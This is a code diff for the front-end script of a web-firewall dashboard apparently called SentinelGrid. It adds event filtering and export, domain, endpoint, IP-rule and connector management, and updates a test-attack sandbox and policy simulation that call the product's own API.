-        const tbody = document.getElementById("telemetry-body");
-        if (data.recent_events && data.recent_events.length > 0) {
-          tbody.innerHTML = data.recent_events.map(ev => {
-            let badge = `<span class="badge badge-allow">ALLOW</span>`;
-            if (ev.action === "BLOCK") badge = `<span class="badge badge-block">BLOCK (403)</span>`;
-            if (ev.action === "CHALLENGE") badge = `<span class="badge badge-challenge">CHALLENGE</span>`;
-            return `
-              <tr>
-                <td style="font-family: var(--font-mono); color: var(--text-muted);">${ev.timestamp.substring(11, 19)} UTC</td>
-                <td style="font-family: var(--font-mono); font-weight: 600;">${ev.client_ip}</td>
-                <td><strong style="color: var(--deep-indigo);">${ev.method}</strong> <code>${ev.path}</code></td>
-                <td><strong>${ev.risk_score}</strong>/100</td>
-                <td>${badge}</td>
-                <td style="color: ${ev.action === 'BLOCK' ? 'var(--terracotta)' : 'inherit'}; font-weight: 600;">${ev.rule_triggered || 'Clean'}</td>
-              </tr>
-            `;
-          }).join("");
-        }
+        allRecentEvents = data.recent_events || [];
+        renderEventsTable(allRecentEvents);
       } catch (e) {
         console.error("Dashboard refresh error:", e);
+      }
+    }
+
+    function renderEventsTable(events) {
+      const tbody = document.getElementById("telemetry-body");
+      if (!events || events.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">No security events recorded yet. All incoming traffic is clean.</td></tr>`;
+        return;
+      }
+      tbody.innerHTML = events.map(ev => {
+        let badge = `<span class="badge badge-allow">ALLOW</span>`;
+        if (ev.action === "BLOCK") badge = `<span class="badge badge-block">BLOCK (403)</span>`;
+        if (ev.action === "CHALLENGE") badge = `<span class="badge badge-challenge">CHALLENGE</span>`;
+        return `
+          <tr>
+            <td style="font-family: var(--font-mono); color: var(--text-muted);">${(ev.timestamp || '').substring(11, 19)} UTC</td>
+            <td style="font-family: var(--font-mono); font-weight: 600;">${ev.client_ip}</td>
+            <td><strong style="color: var(--deep-indigo);">${ev.method}</strong> <code>${ev.path}</code></td>
+            <td><strong>${ev.risk_score}</strong>/100</td>
+            <td>${badge}</td>
+            <td style="color: ${ev.action === 'BLOCK' ? 'var(--terracotta)' : 'inherit'}; font-weight: 600;">${ev.rule_triggered || 'Clean'}</td>
+          </tr>
+        `;
+      }).join("");
+    }
+
+    function applyEventFilter() {
+      const action = document.getElementById("event-filter-action").value;
+      const q = document.getElementById("event-search-query").value.toLowerCase().trim();
+
+      let filtered = allRecentEvents;
+      if (action !== "ALL") {
+        filtered = filtered.filter(ev => ev.action === action);
+      }
+      if (q) {
+        filtered = filtered.filter(ev => 
+          (ev.client_ip && ev.client_ip.toLowerCase().includes(q)) ||
+          (ev.path && ev.path.toLowerCase().includes(q)) ||
+          (ev.rule_triggered && ev.rule_triggered.toLowerCase().includes(q))
+        );
+      }
+      renderEventsTable(filtered);
+    }
+
+    async function exportEvents() {
+      try {
+        const res = await fetch(`${API}/events/export?limit=500`);
+        const data = await res.json();
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = `sentinelgrid_events_${new Date().toISOString().substring(0, 10)}.json`;
+        a.click();
+      } catch (e) {
+        alert("Export failed: " + e);
+      }
+    }
+
+    // -------------------------------------------------------------------------
+    // Domains Management
+    // -------------------------------------------------------------------------
+    function showAddDomainModal() { document.getElementById("add-domain-box").style.display = "block"; }
+    function hideAddDomainModal() { document.getElementById("add-domain-box").style.display = "none"; }
+
+    async function loadDomains() {
+      try {
+        const res = await fetch(`${API}/websites`);
+        const list = await res.json();
+        const tbody = document.getElementById("domains-table-body");
+        if (!list || list.length === 0) {
+          tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 30px;">No domains registered yet. Click '+ Add Protected Domain' above.</td></tr>`;
+          return;
+        }
+        tbody.innerHTML = list.map(d => `
+          <tr>
+            <td><span class="badge ${d.status === 'active' ? 'badge-online' : 'badge-offline'}">${d.status.toUpperCase()}</span></td>
+            <td><strong>${d.domain}</strong></td>
+            <td>${d.name}</td>
+            <td><strong>${d.endpoint_count || 0}</strong> routes</td>
+            <td><span style="color: ${(d.shadow_count || 0) > 0 ? 'var(--terracotta)' : 'inherit'}; font-weight: 700;">${d.shadow_count || 0}</span></td>
+            <td>${d.event_count || 0}</td>
+            <td style="font-family: var(--font-mono); color: var(--text-muted); font-size: 11px;">${(d.created_at || '').substring(0, 10)}</td>
+            <td>
+              <button class="btn btn-subtle" style="padding: 4px 8px; font-size: 11px; color: var(--terracotta);" onclick="deleteDomain('${d.id}')">Delete</button>
+            </td>
+          </tr>
+        `).join("");
+      } catch (e) {
+        console.error("Domains error:", e);
+      }
+    }
+
+    async function submitNewDomain() {
+      const domain = document.getElementById("new-domain-input").value.trim();
+      const name = document.getElementById("new-domain-name").value.trim() || domain;
+      if (!domain) {
+        alert("Please enter a domain name.");
+        return;
+      }
+      try {
+        const res = await fetch(`${API}/websites`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ domain: domain, name: name })
+        });
+        const d = await res.json();
+        if (res.ok) {
+          alert(`Domain ${domain} registered successfully!`);
+          document.getElementById("new-domain-input").value = "";
+          document.getElementById("new-domain-name").value = "";
+          hideAddDomainModal();
+          loadDomains();
+          refreshDashboard();
+        } else {
+          alert("Error: " + (d.detail || "Failed to register domain"));
+        }
+      } catch (e) {
+        alert("Failed to register domain: " + e);
+      }
+    }
+
+    async function deleteDomain(siteId) {
+      if (!confirm("Are you sure you want to delete this domain and all its routes?")) return;
+      try {
+        const res = await fetch(`${API}/websites/${siteId}`, { method: "DELETE" });
+        if (res.ok) {
+          loadDomains();
+          refreshDashboard();
+        } else {
+          const d = await res.json();
+          alert("Delete error: " + d.detail);
+        }
+      } catch (e) {
+        alert("Delete failed: " + e);
+      }
+    }
+
+    // -------------------------------------------------------------------------
+    // Endpoints Catalog & OpenAPI Spec
+    // -------------------------------------------------------------------------
+    function toggleSpecImport() {
+      const el = document.getElementById("spec-import-box");
+      el.style.display = el.style.display === "none" ? "block" : "none";
+    }
+
+    async function submitOpenApiSpec() {
+      const content = document.getElementById("spec-content-input").value.trim();
+      if (!content) {
+        alert("Please paste OpenAPI specification content.");
+        return;
+      }
+      try {
+        const res = await fetch(`${API}/api-specs/import`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ website_id: "default-site", spec_content: content })
+        });
+        const d = await res.json();
+        if (res.ok) {
+          alert(`Successfully imported ${d.imported_endpoints_count} endpoints from '${d.title}' v${d.version}!`);
+          document.getElementById("spec-content-input").value = "";
+          toggleSpecImport();
+          loadEndpoints();
+          refreshDashboard();
+        } else {
+          alert("Import error: " + (d.detail || "Failed to parse spec"));
+        }
+      } catch (e) {
+        alert("Import failed: " + e);
       }
     }
 
@@ -663,33 +1037,139 @@
         const res = await fetch(`${API}/endpoints`);
         const list = await res.json();
         const tbody = document.getElementById("endpoints-body");
-        if (list && list.length > 0) {
-          tbody.innerHTML = list.map(ep => {
-            let badge = `<span class="badge badge-allow">DOCUMENTED</span>`;
-            if (ep.status === "shadow") badge = `<span class="badge badge-shadow">SHADOW</span>`;
-            if (ep.status === "zombie") badge = `<span class="badge badge-challenge">ZOMBIE</span>`;
-            return `
-              <tr>
-                <td>${badge}</td>
-                <td style="color: var(--text-muted);">${ep.domain}</td>
-                <td><strong>${ep.method}</strong></td>
-                <td><code>${ep.path}</code></td>
-                <td><strong>${ep.risk_level}</strong></td>
-                <td style="font-family: var(--font-mono); color: var(--text-muted);">${ep.last_seen.substring(11, 19)}</td>
-              </tr>
-            `;
-          }).join("");
+        if (!list || list.length === 0) {
+          tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">No endpoints cataloged yet. Paste your OpenAPI specification above or route traffic through SentinelGrid.</td></tr>`;
+          return;
         }
+        tbody.innerHTML = list.map(ep => {
+          let badge = `<span class="badge badge-allow">DOCUMENTED</span>`;
+          if (ep.status === "shadow") badge = `<span class="badge badge-shadow">SHADOW</span>`;
+          if (ep.status === "zombie") badge = `<span class="badge badge-challenge">ZOMBIE</span>`;
+          return `
+            <tr>
+              <td>${badge}</td>
+              <td style="color: var(--text-muted); font-weight: 600;">${ep.domain || 'All Domains'}</td>
+              <td><strong>${ep.method}</strong></td>
+              <td><code>${ep.path}</code></td>
+              <td><strong>${ep.risk_level}</strong></td>
+              <td style="font-family: var(--font-mono); color: var(--text-muted);">${(ep.last_seen || '').substring(11, 19)}</td>
+            </tr>
+          `;
+        }).join("");
       } catch (e) {
         console.error("Endpoints error:", e);
       }
     }
 
+    // -------------------------------------------------------------------------
+    // IP Access Control
+    // -------------------------------------------------------------------------
+    function toggleAddIpRule() {
+      const el = document.getElementById("add-iprule-box");
+      el.style.display = el.style.display === "none" ? "block" : "none";
+    }
+
+    async function loadIpRules() {
+      try {
+        const res = await fetch(`${API}/ip-rules`);
+        const list = await res.json();
+        const tbody = document.getElementById("iprules-table-body");
+        if (!list || list.length === 0) {
+          tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">No IP access rules configured. Click '+ Add IP Rule' above.</td></tr>`;
+          return;
+        }
+        tbody.innerHTML = list.map(r => `
+          <tr>
+            <td><span class="badge ${r.action === 'BLOCK' ? 'badge-block' : 'badge-allow'}">${r.action}</span></td>
+            <td><code style="font-size: 13px; font-weight: 700;">${r.ip_or_cidr}</code></td>
+            <td>${r.description || 'Custom ACL rule'}</td>
+            <td style="font-family: var(--font-mono); color: var(--text-muted); font-size: 11px;">${(r.created_at || '').substring(0, 10)}</td>
+            <td>
+              <button class="btn btn-subtle" style="padding: 4px 8px; font-size: 11px; color: var(--terracotta);" onclick="deleteIpRule('${r.id}')">Delete</button>
+            </td>
+          </tr>
+        `).join("");
+      } catch (e) {
+        console.error("IP rules error:", e);
+      }
+    }
+
+    async function submitIpRule() {
+      const addr = document.getElementById("ip-rule-addr").value.trim();
+      const action = document.getElementById("ip-rule-action").value;
+      const desc = document.getElementById("ip-rule-desc").value.trim();
+      if (!addr) {
+        alert("Please enter an IP address or CIDR notation.");
+        return;
+      }
+      try {
+        const res = await fetch(`${API}/ip-rules`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ website_id: "default-site", ip_or_cidr: addr, action: action, description: desc })
+        });
+        const d = await res.json();
+        if (res.ok) {
+          document.getElementById("ip-rule-addr").value = "";
+          document.getElementById("ip-rule-desc").value = "";
+          toggleAddIpRule();
+          loadIpRules();
+        } else {
+          alert("Error: " + (d.detail || "Failed to add IP rule"));
+        }
+      } catch (e) {
+        alert("Failed to submit rule: " + e);
+      }
+    }
+
+    async function deleteIpRule(ruleId) {
+      try {
+        const res = await fetch(`${API}/ip-rules/${ruleId}`, { method: "DELETE" });
+        if (res.ok) {
+          loadIpRules();
+        } else {
+          const d = await res.json();
+          alert("Delete error: " + d.detail);
+        }
+      } catch (e) {
+        alert("Delete failed: " + e);
+      }
+    }
+
+    // -------------------------------------------------------------------------
+    // Connectors
+    // -------------------------------------------------------------------------
+    async function loadConnectors() {
+      try {
+        const res = await fetch(`${API}/connectors`);
+        const list = await res.json();
+        const tbody = document.getElementById("connectors-table-body");
+        if (!list || list.length === 0) {
+          tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">No active connectors registered yet. Follow the 'Setup Guide' to attach your first site.</td></tr>`;
+          return;
+        }
+        tbody.innerHTML = list.map(c => `
+          <tr>
+            <td><span class="badge ${c.status === 'online' ? 'badge-online' : 'badge-offline'}">${c.status.toUpperCase()}</span></td>
+            <td><strong>${c.name}</strong></td>
+            <td><code>${c.connector_type}</code></td>
+            <td><strong>${c.latency_ms || 0.8} ms</strong></td>
+            <td style="font-family: var(--font-mono); color: var(--text-muted);">${(c.last_heartbeat || '').substring(11, 19)} UTC</td>
+          </tr>
+        `).join("");
+      } catch (e) {
+        console.error("Connectors error:", e);
+      }
+    }
+
+    // -------------------------------------------------------------------------
+    // WAF Lab Sandbox
+    // -------------------------------------------------------------------------
     async function fireLiveAttack() {
       const method = document.getElementById("attack-method").value;
-      const path = document.getElementById("attack-path").value;
-      const body = document.getElementById("attack-body").value;
-      const ua = document.getElementById("attack-ua").value;
+      const path = document.getElementById("attack-path").value.trim() || "/api/v1/checkout/stripe";
+      const body = document.getElementById("attack-body").value.trim();
+      const ua = document.getElementById("attack-ua").value.trim() || "Mozilla/5.0";
       const box = document.getElementById("attack-output");
 
       box.style.display = "block";
@@ -700,7 +1180,7 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            website_id: "site-1",
+            website_id: "default-site",
             method: method,
             path: path,
             body: body,
@@ -722,9 +1202,12 @@
       }
     }
 
+    // -------------------------------------------------------------------------
+    // Policy Simulation
+    // -------------------------------------------------------------------------
     async function runSimulation() {
-      const ruleId = document.getElementById("sim-rule-id").value;
-      const ua = document.getElementById("sim-rule-ua").value;
+      const ruleId = document.getElementById("sim-rule-id").value.trim() || "block-unverified-bots";
+      const ua = document.getElementById("sim-rule-ua").value.trim() || "bot";
       const box = document.getElementById("sim-output");
 
       box.style.display = "block";
@@ -734,7 +1217,7 @@
         const res = await fetch(`${API}/simulate-rule`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ website_id: "site-1", rule_name: ruleId, criteria_ua: ua })
+          body: JSON.stringify({ website_id: "default-site", rule_name: ruleId, criteria_ua: ua })
         });
         const rep = await res.json();
         box.innerHTML = `
@@ -755,7 +1238,7 @@
         const res = await fetch(`${API}/policies/rollback`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ website_id: "site-1", target_version: 1 })
+          body: JSON.stringify({ website_id: "default-site", target_version: 1 })
         });
         const d = await res.json();
         alert(`Rollback successful! Restored to policy v${d.policy.version} with fresh Ed25519 signature.`);
@@ -764,7 +1247,7 @@
       }
     }
 
-    // Initialize
+    // Initialize on page load
     refreshDashboard();
   </script>
 </body>
